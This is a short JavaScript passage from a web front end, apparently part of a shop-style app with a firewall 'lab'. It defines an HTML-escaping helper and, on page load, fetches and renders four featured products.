function escapeHtml(s) { return s.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;").replace(/\n/g,"<br/>"); }

// ═══════════════════════════════════════════════════════════════════════════
// INIT
// ═══════════════════════════════════════════════════════════════════════════
document.addEventListener("DOMContentLoaded", () => {
  navigate("home");
  initLab();
  // Load featured products on home page
  setTimeout(async () => {
    const { data } = await wafFetch("/api/products");
    const grid = document.getElementById("featured-grid");
    if (grid && data?.products) {
      grid.innerHTML = data.products.slice(0, 4).map(renderProductCard).join("");
    }
  }, 100);
});
